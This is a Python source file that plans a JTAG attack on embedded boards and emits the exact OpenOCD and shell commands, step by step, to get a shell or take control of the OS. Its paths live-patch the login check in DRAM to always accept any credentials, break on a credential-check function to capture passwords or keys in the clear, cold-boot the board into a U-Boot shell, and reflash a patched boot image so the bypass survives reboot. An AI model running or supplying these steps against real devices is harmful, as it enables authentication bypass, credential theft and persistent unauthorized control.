"""
jtagtoshell.py — the "get a shell / take control of the OS via JTAG" planner.

This is the capstone that chains every capability the toolkit already has (dump,
locate, patch, break-capture, cold-boot, reflash) into one ordered, board-state-aware
runbook. It does NOT touch hardware — it reads a posture (from a capture or explicit
flags) and EMITS the exact commands the operator runs, in order, with the reasoning
for why that path was chosen. Per the project's hands-on-JTAG model, the operator
always drives the live commands themselves.

Four paths, chosen from board state:

  A. LIVE-PATCH  (an OS is already running) — dump DRAM, locate the auth/login check,
     generate a force-return patch, write it via probe-phys-patch (a MEMORY WRITE,
     not code injection), then log in on the serial console with any credentials.
     This is the SAFE path: it never asks OpenOCD to execute injected code on a live
     core, which is what wedges the DAP on OpenOCD 0.12 (see the WEDGE WARNING below).

  B. CATCH-IN-FLIGHT  (an OS is running and you want a real secret, not just access) —
     HW-breakpoint a credential-check function and dump registers/derefs when it's
     hit, catching a password/key in the clear without ever touching flash.

  C. COLD-BOOT  (nothing is running — idle/JTAG-halted board) — bring up DDR by
     replaying psu_init as MMIO (no FSBL execution, so no boot-device wedge), then
     load U-Boot over JTAG. The U-Boot prompt IS a shell: full memory access, can
     boot an attacker-controlled kernel/initramfs from there.

  D. PERSIST  (you have a working bypass and want it to survive reboot) — repack the
     boot image with the patch baked in (bootgen checksums recomputed) and reflash.
     Destructive; turns a one-shot bypass into permanent access.

Paths are not mutually exclusive — A/B need C first if nothing is running, and D is
an optional finisher after A/B/C. plan() returns the right sequence for the state.
"""
from __future__ import annotations

from dataclasses import dataclass, field

WEDGE_WARNING = (
    "OpenOCD 0.12 on ZynqMP: injecting FRESH code onto a halted live core and jumping "
    "to it WEDGES THE DAP (cache-coherence/SCTLR issue — see cache-coherence-test.tcl). "
    "The reliable primitive is a MEMORY WRITE to an address already mapped and executed "
    "by the running image (probe-phys-patch overwrites an instruction in place) — never "
    "'inject new code and call it'. Paths A and D use only memory writes; if a step here "
    "ever asks for live code execution on a running core, stop and re-plan."
)


@dataclass
class Step:
    title: str
    cmd: str = ""
    note: str = ""


@dataclass
class RunbookPath:
    id: str
    title: str
    why: str
    steps: list = field(default_factory=list)


def _step(title, cmd="", note=""):
    return {"title": title, "cmd": cmd, "note": note}


def _dump_step(soc: str, addr="0x00100000", size="0x02000000", label="os-live"):
    cfg = f"openocd/{soc}.cfg" if soc != "zynqmp" else "openocd/zcu102.cfg"
    return _step(
        "Dump the live OS out of DRAM",
        f'DUMP_ADDR={addr} DUMP_SIZE={size} DUMP_LABEL={label} '
        f'openocd -f {cfg} -c "init; source openocd/dump-os-ddr.tcl; shutdown"',
        "Non-destructive AXI mem-AP read; works WHILE the OS runs. Adjust DUMP_ADDR/SIZE "
        "to the region you need (0x0/0x80000000 DUMP_SPARSE=1 for 'grab everything').",
    )


def _locate_step(dump_path="dumps/os-live.bin"):
    return _step(
        "Locate the auth/login check to patch",
        f"python3 tools/find-patch-target.py {dump_path}   # ranked VAs + a ready PATCH_VA/PATCH_STR command",
        "Or, with a symbol map: python3 tools/symbol-crypto.py "
        f"{dump_path} --syms dumps/symbols.txt -o reports/sym-crypto.md — finds named "
        "crypto/auth globals directly. Ghidra the binary if neither finds an obvious target "
        "(tools/ghidra-loadspec.py).",
    )


def _patch_recipe_step(func_hint="authCheck"):
    return _step(
        "Generate the force-return patch",
        f"python3 tools/patch-recipe.py --arch aarch64 --func {func_hint} "
        "--syms dumps/symbols.txt --behavior ret0   # or --va 0x<addr> without symbols",
        "--behavior ret0 makes the function always return 0/success (the classic "
        "auth-bypass shape: 'if (check() != 0) reject' becomes always-accept). "
        "ret1/nop/hang are the other canned behaviors.",
    )


def _apply_patch_step(soc: str):
    cfg = f"openocd/{soc}.cfg" if soc != "zynqmp" else "openocd/zcu102.cfg"
    return _step(
        "Apply the patch (memory write, not code injection)",
        f'PATCH_VA=0x<from previous step> PATCH_WORD=0x<from previous step> PATCH_RESTORE=0 \\\n'
        f'  openocd -f {cfg} -c "init; source openocd/probe-phys-patch.tcl; shutdown"',
        "VA -> PA translation + an AXI-AP write to the live, already-executing image. "
        "Set PATCH_HALT=0 to skip halting the core on a flaky DAP (VMware passthrough). "
        + WEDGE_WARNING,
    )


def _shell_step():
    return _step(
        "Get the shell",
        "screen /dev/ttyUSB0 115200    # PS UART0 — the target's own console",
        "Log in with any credentials (or none) — the auth check now always accepts. "
        "This is a REAL interactive shell on the target's serial console, not the "
        "OpenOCD Tcl console (JTAG was the lever, not the terminal).",
    )


def _break_capture_step(soc: str, func_hint="authCheck"):
    cfg = f"openocd/{soc}.cfg" if soc != "zynqmp" else "openocd/zcu102.cfg"
    return _step(
        "Break on the credential check and capture it live",
        f'BC_ADDR=0x<{func_hint} VA> BC_DEREF="0 1" BC_BT=1 \\\n'
        f'  openocd -f {cfg} -c "init; source openocd/break-capture.tcl; shutdown" \\\n'
        f'  | python3 tools/symbolize.py --annotate --syms dumps/symbols.txt',
        "A HW breakpoint dumps x0-x30/sp/pc the instant the function is hit, and "
        "BC_DEREF follows pointer arguments (x0, x1, ...) via AXI — the password/key "
        "is in a register or freshly-derefed buffer, in the clear, before any hashing.",
    )


def _coldboot_steps(soc: str):
    cfg = f"openocd/{soc}.cfg" if soc != "zynqmp" else "openocd/zcu102.cfg"
    return [
        _step("Generate the psu_init replay (once per board)", "python3 tools/psu-init-to-jtag.py",
             "-> openocd/psu-init-replay.tcl. Replays psu_init as MMIO with the A53 halted — "
             "no FSBL execution, so no boot-device wedge."),
        _step("Bring up DDR over pure JTAG", f'openocd -f {cfg} -c "source openocd/jtag-ddr-boot.tcl" -c shutdown'),
        _step("Load U-Boot over JTAG", f'openocd -f {cfg} -c "source openocd/jtag-load-uboot.tcl" -c shutdown',
             "4096-word chunked write + per-chunk retry — the robust loader."),
        _step("Attach the U-Boot console", "screen /dev/ttyUSB0 115200",
             "The U-Boot prompt IS a shell: full memory read/write, can `bootm`/`booti` your "
             "own kernel+initramfs from here, or `sf probe; sf read` to pull flash contents."),
    ]


def _persist_steps(soc: str):
    """The reflash mechanism is SoC-family-specific: ZynqMP writes the QSPI/SD boot
    image in place via the safe-first qspi-write.tcl path (bootgen-checksummed BH/
    IHT/PHT, sub-sector erase+program+verify); Cortex-M parts reflash internal flash
    directly via cortexm-flash.tcl (no bootgen wrapper)."""
    cfg = f"openocd/{soc}.cfg" if soc not in ("zynqmp", "zynq7000") else "openocd/zcu102.cfg"
    if soc in ("zynqmp", "zynq7000"):
        return [
            _step("Inspect the boot image partitions", "python3 tools/repack-bootimage.py dumps/boot-image.bin --inspect"),
            _step("Prep the QSPI sub-sector patch (offline)",
                 "python3 tools/qspi-make-patch.py dumps/boot-image.bin "
                 "--offset 0x<logical> --hex <bytes> -o /tmp/qpatch.tcl",
                 "Sidesteps Tcl binary I/O; the offset+bytes come from patch-recipe.py's output above."),
            _step("SAFE write-path probes FIRST (no flash change)",
                 f'QW_OP=srtest   openocd -f {cfg} -c "init; source openocd/qspi-write.tcl; shutdown"   # RDSR both dies\n'
                 f'QW_OP=wrentest openocd -f {cfg} -c "init; source openocd/qspi-write.tcl; shutdown"   # WEL latches',
                 "Confirm the write path works before touching real flash. Also confirm the boot mode "
                 "first (BOOT_MODE_USER 0xFF5E0200 bits[3:0]: 0x2=QSPI32, 0x3/0x5=SD) — a botched write "
                 "can brick the board if flash is the only boot source."),
            _step("Write the patch (4KB sub-sector erase + program + verify)",
                 f'QW_OP=patch QW_DATA=/tmp/qpatch.tcl openocd -f {cfg} -c "init; source openocd/qspi-write.tcl; shutdown"',
                 "DESTRUCTIVE — keep the original dumps/boot-image.bin to restore (re-run QW_OP=patch "
                 "with the unpatched bytes)."),
            _step("Power-cycle and verify", "(power-cycle the board) — then re-read the function's .text over JTAG to confirm the patch survived boot."),
        ]
    return [
        _step("Inspect the boot image partitions", "python3 tools/repack-bootimage.py dumps/boot-image.bin --inspect"),
        _step("Repack with the patch baked in",
             "python3 tools/repack-bootimage.py dumps/boot-image.bin "
             "--patch 0x<offset>=<hex bytes> -o dumps/boot-patched.bin",
             "Recomputes bootgen checksums so the CSU BootROM still accepts the image. "
             "DESTRUCTIVE — this replaces the boot image."),
        _step("Reflash", f'CMF_FILE=dumps/boot-patched.bin openocd -f {cfg} -c "init; source openocd/cortexm-flash.tcl; shutdown"',
             "Every subsequent boot now carries the bypass automatically."),
    ]


def plan(state: dict, soc: str = "zynqmp") -> dict:
    """Build the ordered runbook for the given board state.

    state keys (all optional, sane defaults assumed):
      firmware_running (bool)  — is an OS/firmware already executing? (from a53.firmware_running)
      invasive_debug (str)     — 'open' | 'gated' | 'wedged' | 'unreachable' (from a53.invasive_debug)
      goal (str)               — 'shell' (default) | 'secret' | 'persist'
      have_dump (bool)         — operator already has dumps/os-live.bin
      have_symbols (bool)      — operator already has dumps/symbols.txt

    Returns {paths: [RunbookPath-as-dict, ...], caveats: [...], recommended: <id>}.
    Multiple paths may be returned (e.g. cold-boot is a prerequisite, not an
    alternative, when nothing is running); `recommended` names the primary one.
    """
    fw = bool(state.get("firmware_running", False))
    inv = state.get("invasive_debug", "open")
    goal = state.get("goal", "shell")
    have_dump = bool(state.get("have_dump", False))

    if inv in ("gated", "wedged", "unreachable"):
        return {
            "paths": [{
                "id": "unlock-first", "title": "Debug is not open — unlock before any shell path",
                "why": f"invasive_debug={inv}: the DAP cannot halt/access this core yet.",
                "steps": [
                    _step("Run the unlock engine for a reopen plan",
                         f"python3 tools/unlock-engine.py --soc {soc} --jtag-locked",
                         "Emits the ranked reopen strategies (register lever / mass-erase / "
                         "eFuse-sealed=hardware-only) for this posture."),
                    _step("If wedged specifically", "power-cycle the board, then re-run enumerate.tcl",
                         "A 'wedged' core is stuck on a bus access, not locked — EDPCSR can still "
                         "read its frozen PC, but only a power-cycle recovers halt."),
                ],
            }],
            "caveats": [WEDGE_WARNING],
            "recommended": "unlock-first",
        }

    paths = []

    if not fw:
        # Nothing running — cold-boot is the prerequisite for every other path.
        cb = RunbookPath(
            id="coldboot", title="C. Cold-boot to a U-Boot shell",
            why="No firmware is currently running (a53.firmware_running=False) — bring up DDR and "
                "load U-Boot over pure JTAG. This alone gets you a real shell; it's also the "
                "prerequisite if the goal needs an OS running (secret/persist) to reach paths A/B.",
            steps=_coldboot_steps(soc),
        )
        paths.append(cb)
        if goal == "shell":
            return {"paths": [cb.__dict__], "caveats": [WEDGE_WARNING], "recommended": "coldboot"}
        # secret/persist with nothing running: cold-boot first (above), then boot an OS
        # from U-Boot and re-plan with firmware_running=True — the steps below assume
        # that OS is now up, so note the gap explicitly rather than emit steps that need it.
        cb.steps.append(_step(
            "Boot an OS from U-Boot, THEN continue",
            "boot / bootm <kernel-addr>   # at the U-Boot prompt",
            "Path " + ("B" if goal == "secret" else "A + D") + " below assumes an OS is now "
            "running — re-run this planner (or just continue manually) once it's up."))

    if goal == "shell":
        a = RunbookPath(
            id="live-patch", title="A. Live-patch the auth check → log in normally",
            why="An OS is already running — dump it, locate the login/auth check, force it to "
                "always accept, then log in on the real console. Uses ONLY memory writes to "
                "already-executing code, never fresh code injection (see the wedge warning).",
            steps=([] if have_dump else [_dump_step(soc)])
                  + [_locate_step(), _patch_recipe_step(), _apply_patch_step(soc), _shell_step()],
        )
        paths.append(a)

    elif goal == "secret":
        b = RunbookPath(
            id="catch-in-flight", title="B. Catch the credential in flight",
            why="You want the actual secret (password/key), not just access — break on the "
                "check function and dump it the instant it's called, before any hashing. No "
                "dump/patch needed, just the function's address (find it via the same "
                "find-patch-target/symbol-crypto tools, or supply a known VA).",
            steps=[_locate_step(), _break_capture_step(soc)],
        )
        paths.append(b)

    elif goal == "persist":
        # Persistence is validated live first (path A), then baked into the image (path D).
        a = RunbookPath(
            id="live-patch", title="A. Validate the patch live first",
            why="Confirm the bypass actually works before committing it to the boot image — "
                "a bad patch baked into flash is a much worse day than a bad patch in RAM.",
            steps=([] if have_dump else [_dump_step(soc)])
                  + [_locate_step(), _patch_recipe_step(), _apply_patch_step(soc), _shell_step()],
        )
        d = RunbookPath(
            id="persist", title="D. Make it permanent (reflash)",
            why="Bake the validated bypass into the boot image so it survives reboot. "
                "Destructive — this replaces the boot image; keep the original.",
            steps=_persist_steps(soc),
        )
        paths.append(a)
        paths.append(d)

    recommended = next((p.id for p in paths if p.id != "coldboot"), paths[0].id if paths else "live-patch")
    return {"paths": [p.__dict__ for p in paths], "caveats": [WEDGE_WARNING], "recommended": recommended}


def from_capture(raw: dict, goal: str = "shell", soc: str = None) -> dict:
    """Derive state from a raw enumeration capture (a53.firmware_running /
    a53.invasive_debug) and call plan()."""
    a53 = raw.get("a53", {}) if isinstance(raw, dict) else {}
    meta = raw.get("metadata", {}) if isinstance(raw, dict) else {}
    state = {
        "firmware_running": a53.get("firmware_running", False),
        "invasive_debug": a53.get("invasive_debug", "open"),
        "goal": goal,
    }
    return plan(state, soc=soc or (meta.get("soc") or "zynqmp").lower())


def render_md(result: dict) -> str:
    lines = ["# JTAG-to-Shell Runbook", ""]
    if result.get("caveats"):
        lines += ["> **Read first:**"] + [f"> {c}" for c in result["caveats"]] + [""]
    for p in result["paths"]:
        rec = " (recommended)" if p["id"] == result.get("recommended") else ""
        lines += [f"## {p['title']}{rec}", "", f"_{p['why']}_", ""]
        for i, s in enumerate(p["steps"], 1):
            lines.append(f"**{i}. {s['title']}**")
            if s.get("cmd"):
                lines += ["```", s["cmd"], "```"]
            if s.get("note"):
                lines.append(f"> {s['note']}")
            lines.append("")
    return "\n".join(lines)
